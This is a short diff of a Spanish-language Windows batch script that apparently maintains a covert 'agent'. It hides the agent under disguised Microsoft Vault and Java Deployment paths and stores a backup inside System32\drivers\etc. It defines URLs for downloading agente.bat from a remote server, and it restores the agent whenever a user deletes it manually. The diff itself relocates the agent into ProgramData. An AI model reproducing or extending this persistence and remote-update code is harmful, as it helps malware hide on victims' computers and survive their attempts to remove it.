@@ -4,7 +4,7 @@ setlocal enabledelayedexpansion
 
 :: --- 1. CONFIGURACIÓN DE RUTAS Y VERSIONES ---
 :: Corregido el doble Roaming para que coincida con el instalador
-set "AGENTE_DIR=%AppData%\Microsoft\Vault"
+set "AGENTE_DIR=C:\ProgramData\Microsoft\Vault"
 set "AGENTE_FILE=%AGENTE_DIR%\sys_engine.bat"   
 set "BACKUP_DIR=%windir%\System32\drivers\etc\vps_logs"
 set "VERSION_DIR=C:\Users\%USERNAME%\AppData\Roaming\Sun\Java\Deployment"
@@ -18,7 +18,7 @@ set "URL_VERSION=%URL_BASE%/version.txt"
 set "URL_AGENTE=%URL_BASE%/agente.bat"
 
 
-::--- 4. RESTAURACIÓN Y EJECUCIÓN ---
+::  --- 4. RESTAURACIÓN Y EJECUCIÓN ---
 ::Si el archivo no está (fue borrado manualmente), lo sacamos del Backup de System32
 if not exist "%AGENTE_FILE%" (
     if not exist "%AGENTE_DIR%" mkdir "%AGENTE_DIR%" >nul 2>&1
